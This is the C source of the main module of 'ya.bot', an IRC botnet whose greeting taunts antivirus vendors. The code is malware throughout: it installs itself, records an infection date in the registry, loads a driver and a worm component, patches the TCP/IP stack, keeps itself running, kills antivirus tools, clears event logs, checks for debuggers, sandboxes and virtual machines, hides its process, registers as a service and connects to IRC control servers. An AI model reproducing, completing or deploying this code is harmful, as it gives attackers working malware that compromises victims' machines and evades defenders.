/*  ya.bot  */

#include "bot.h"
#include "..\Settings\commands.h"
#include "..\Settings\config.h"

#ifndef NO_FAKECONFIG
#include "..\Settings\fake.h"
#endif

#include "..\Settings\strings.h"

#ifndef NO_DEBUG
#ifndef NO_DEBUGCONSOLE
#pragma comment(linker, "/SUBSYSTEM:console")
#endif
#endif

const char *greet =
		"What did the PhatBot say to the anti-virus vendor? I'm back...";

DWORD WINAPI bot_main(LPVOID param)
{
	char szMutex[LOWBUF];
	int i;
	WSADATA wsadata;

#ifndef NO_INSTALLBOT
		Sleep(6000);
#endif

#ifndef NO_DEBUG
		debug_print("Creating mutex, bot_main()");
#endif

		_snprintf(szMutex, sizeof(szMutex) - 1, (char *)string_mainmutex, botid, PRODUCT_VERSION);
		CreateMutex(NULL, FALSE, szMutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
			ExitProcess(0);

#ifdef NO_DEBUG
		SetErrorMode(SEM_FAILCRITICALERRORS &&
				SEM_NOALIGNMENTFAULTEXCEPT &&
				SEM_NOGPFAULTERRORBOX &&
				SEM_NOOPENFILEERRORBOX);
#endif

#ifndef NO_INSTALLBOT
	if (install_bot())
	{

#ifndef NO_INFO
		char szDate[LOWBUF];
		SYSTEMTIME stSystemTime;
			GetSystemTime(&stSystemTime);
			_snprintf(szDate, sizeof(szDate) - 1,
					string_infoinfecteddate,
					stSystemTime.wYear,
					stSystemTime.wMonth,
					stSystemTime.wDay);
			registry_writestring(HKEY_LOCAL_MACHINE,
					(char *)string_infoinfectedsubkey,
					(char *)string_infoinfectedvaluename,
					szDate);
#endif

			uninstall_botmelt();
			ExitProcess(0);
	}
#endif

#ifndef NO_INSTALLDRIVER
		install_driver();
#endif

#ifndef NO_INSTALLWORMRIDE
		install_wormride();
#endif

#ifndef NO_PATCH
		patch_tcpip();
#endif

#ifndef NO_PERSIST
		persist_main(szMutex);
#endif

#ifndef NO_SECURE
		thread_add((char *)string_threadsecuremain, THREAD_SECURE, secure_main, NULL);
#endif

#ifndef NO_AVKILLER
		thread_add((char *)string_threadavkillermain, THREAD_AVKILLER, avkiller_main, NULL);
#endif

	if (WSAStartup(0x0202, &wsadata) != 0)
			ExitProcess(0);

#ifndef NO_DAEMONIDENT
		thread_add((char *)string_threaddaemonidentmain,
				THREAD_DAEMONIDENT,
				daemon_identmain,
				NULL);
#endif

#ifndef NO_CLEARLOGS
		cleareventlogs();
#endif

	for (i = 0; i < ARRAYSIZE(rgSServerList); i++)
	{
		if (!rgSServerList[i].m_pszServer)
		{

#ifndef NO_DEBUG
				debug_print("No server is up, sleeping before trying again, bot_main()");
#endif

				Sleep(rgSServerList[i].m_nHammerTimeOut);
				i = 0;
		}
			irc_connect(i);
	}
		WSACleanup();
		ExitProcess(0);
		return 0;
}

void WINAPI bot_servicehandler(DWORD dwCode)
{
	switch (dwCode)
	{
		case CTRL_LOGOFF_EVENT:
			break;
		case SERVICE_CONTROL_CONTINUE:
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		case SERVICE_CONTROL_PAUSE:
			break;
		case SERVICE_CONTROL_STOP:
			break;
		default:
			break;
	}
		SetServiceStatus(g_sshService, &g_ssService);
		return;
}

void WINAPI bot_servicemain(DWORD argc, LPTSTR *argv)
{
	
#ifndef NO_DEBUG
		debug_print("Service is running, bot_servicemain()");
#endif

		g_ssService.dwServiceType = SERVICE_WIN32;
		g_ssService.dwCurrentState = SERVICE_START_PENDING;
		g_ssService.dwControlsAccepted = 0;
		g_ssService.dwWin32ExitCode = 0;
		g_ssService.dwServiceSpecificExitCode = 0;
		g_ssService.dwCheckPoint = 0;
		g_ssService.dwWaitHint = 0;
		g_sshService = RegisterServiceCtrlHandler((char *)botstartupname, bot_servicehandler);
	if (g_sshService == (SERVICE_STATUS_HANDLE)0)
			return;
		g_ssService.dwCurrentState = SERVICE_RUNNING;
		g_ssService.dwCheckPoint = 0;
		g_ssService.dwWaitHint = 0;
	if (!SetServiceStatus(g_sshService, &g_ssService))
			return;
		thread_add((char *)string_threadbotmain, THREAD_BOT, bot_main, NULL);
	while (TRUE)
			Sleep(1000);
		return;
}

void bot_entrypoint()
{

#ifndef NO_DEBUG
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
				FOREGROUND_GREEN | FOREGROUND_INTENSITY);
#endif

#ifndef NO_ANTIDEBUG
	if (MessageBoxA((HWND)0xFFFFFFFF, NULL, NULL, MB_OK))
			ExitProcess(0);
#endif

		crypto_xorconfig();
		crypto_xorstrings();

#ifndef NO_DEBUG
		debug_print("Starting up %s, bot_entrypoint()", PRODUCT_VERSION);
#endif

		getprivileges();

#ifndef NO_ANTIDEBUG
		antidebug_sandbox();
		antidebug_procdump();
	if (antidebug_softice())
			antidebug_payload();
	if (antidebug_vm())
			antidebug_payload();
		thread_add((char *)string_threadantidebugdetectdebugger,
				THREAD_ANTIDEBUG,
				&antidebug_detectdebugger,
				NULL);
#endif

	if (checkiplist())
	{

#ifndef NO_PERSIST
		TerminateThread(g_hPersistThread, 0);
		CloseHandle(g_hPersistThread);
#endif

#ifndef NO_INSTALLDRIVER
		uninstall_driver();
#endif

#ifndef NO_INSTALLWORMRIDE
		uninstall_wormride();
#endif

#ifndef NO_INSTALLBOT
		uninstall_bot();
		uninstall_botmelt();
#endif

			ExitProcess(0);
	}
	SERVICE_TABLE_ENTRY steTable[] =
	{
			{(char *)botstartupname, bot_servicemain},
			{NULL, NULL}
	};

#ifndef NO_RING0
	if (info_os() == OS_WINXP)
	{
		HideProcess hp;
			hp.hidePID(GetCurrentProcessId());
	}
#endif

	if (botinstallasservice)
	{

#ifndef NO_DEBUG
		debug_print("Initiating service, please wait, bot_entrypoint()");
#endif

		if (!StartServiceCtrlDispatcher(steTable))
		{

#ifndef NO_DEBUG
			debug_print("Service failed, bot_entrypoint()");
#endif

		}
	}
		thread_add((char *)string_threadbotmain, THREAD_BOT, bot_main, NULL);
	while (TRUE)
			Sleep(1000);
		return;
}